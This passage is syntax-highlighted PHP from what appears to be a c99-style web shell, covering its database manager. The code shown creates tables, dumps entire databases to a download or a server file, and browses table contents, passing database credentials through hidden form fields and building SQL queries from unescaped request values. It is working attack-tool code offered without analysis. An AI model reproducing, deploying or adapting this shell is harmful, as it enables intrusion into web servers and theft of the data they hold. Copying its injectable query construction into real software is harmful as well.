<span class="x">        &amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;newtbl&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_db&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;text&quot; name=&quot;sql_newtbl&quot; size=&quot;20&quot;&amp;gt;</span>
<span class="x">            Fields: &amp;lt;input type=&quot;text&quot; name=&quot;sql_field&quot; size=&quot;3&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;submit&quot; value=&quot;Create&quot;&amp;gt;</span>
<span class="x">        &amp;lt;/form&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Dump DB:&amp;lt;/b&amp;gt;</span>
<span class="x">        &amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;dump&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_db&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;text&quot; name=&quot;dump_file&quot; size=&quot;30&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$sql_db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Dump&quot;&amp;gt;</span>
<span class="x">        &amp;lt;/form&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;/table&amp;gt;</span>
<span class="cp">&lt;?php</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;newtbl&quot;</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">((</span><span class="nb">mysql_create_db</span> <span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> has been created with success!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;Can&#39;t create DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">.&amp;lt;br&amp;gt;Reason:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">();</span> <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;dump&quot;</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">GET</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">dump</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;SQL-Dump:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;DB:&amp;lt;/b&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$v</span> <span class="o">=</span> <span class="nb">join</span> <span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$dmptbls</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Only tables (explode </span><span class="se">\&quot;</span><span class="s2">;</span><span class="se">\&quot;</span><span class="s2">) &amp;lt;b&amp;gt;&amp;lt;sup&amp;gt;1&amp;lt;/sup&amp;gt;&amp;lt;/b&amp;gt;:&amp;lt;/b&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">dmptbls</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">+</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$dump_file</span><span class="p">)</span> <span class="p">{</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$dump_file</span><span class="p">;}</span>
            <span class="k">else</span> <span class="p">{</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="s2">&quot;./dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$sql_db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">);}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File:&amp;lt;/b&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_file</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$tmp</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span><span class="o">+</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="o">%</span> <span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Download: &amp;lt;/b&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_download</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Save to file: &amp;lt;/b&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_savetofile</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Dump</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;&amp;lt;sup&amp;gt;1&amp;lt;/sup&amp;gt;&amp;lt;/b&amp;gt; - all, if empty&quot;</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
            <span class="nv">$set</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
            <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;sock&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sql_sock</span><span class="p">;</span>
            <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;db&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sql_db</span><span class="p">;</span>
            <span class="nv">$dump_out</span> <span class="o">=</span> <span class="s2">&quot;download&quot;</span><span class="p">;</span>
            <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;print&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;nl2br&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$dump_file</span><span class="p">;</span>
            <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;add_drop&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
            <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$dmptbls</span><span class="p">))</span> <span class="p">{</span><span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$dmptbls</span><span class="p">);}</span>
            <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">mysql_dump</span><span class="p">(</span><span class="nv">$set</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_dump_download</span><span class="p">)</span> <span class="p">{</span>
              <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
              <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
              <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span><span class="o">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
              <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
              <span class="k">echo</span> <span class="nv">$ret</span><span class="p">;</span>
              <span class="k">exit</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_dump_savetofile</span><span class="p">)</span> <span class="p">{</span>
              <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Dump error! Can&#39;t write to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&quot;</span><span class="p">;}</span>
              <span class="k">else</span> <span class="p">{</span>
                <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Dumped! Dump has been writed to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> (&quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/b&amp;gt;.&quot;</span><span class="p">;</span>
              <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Dump: nothing to do!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$diplay</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">))</span> <span class="p">{</span>
              <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_act</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;}</span>
              <span class="nv">$count</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">);</span>
              <span class="nv">$count_row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
              <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
              <span class="nv">$tbl_struct_result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW FIELDS FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">);</span>
                <span class="nv">$tbl_struct_fields</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$tbl_struct_result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tbl_struct_fields</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_ls</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nv">$sql_le</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$sql_le</span> <span class="o">=</span> <span class="nv">$sql_ls</span> <span class="o">+</span> <span class="nv">$perpage</span><span class="p">;</span> <span class="p">}</span>
              <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_page</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_tbl_page</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
              <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_ls</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_tbl_ls</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
              <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_tbl_le</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span> <span class="p">}</span>
              <span class="nv">$perpage</span> <span class="o">=</span> <span class="nv">$sql_tbl_le</span> <span class="o">-</span> <span class="nv">$sql_tbl_ls</span><span class="p">;</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$perpage</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$perpage</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="p">}</span>
              <span class="nv">$numpages</span> <span class="o">=</span> <span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">/</span><span class="nv">$perpage</span><span class="p">;</span>
              <span class="nv">$e</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$sql_order</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$asc_desc</span> <span class="o">=</span> <span class="s2">&quot;DESC&quot;</span><span class="p">;</span> <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span> <span class="nv">$asc_desc</span> <span class="o">=</span> <span class="s2">&quot;ASC&quot;</span><span class="p">;</span> <span class="p">}</span>
                <span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;ORDER BY `&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;` &quot;</span><span class="o">.</span><span class="nv">$asc_desc</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;</span>
              <span class="p">}</span>
              <span class="k">else</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;}</span>
              <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;LIMIT &quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot; , &quot;</span><span class="o">.</span><span class="nv">$perpage</span><span class="o">.</span><span class="s2">&quot;&quot;</span><span class="p">;</span>
              <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
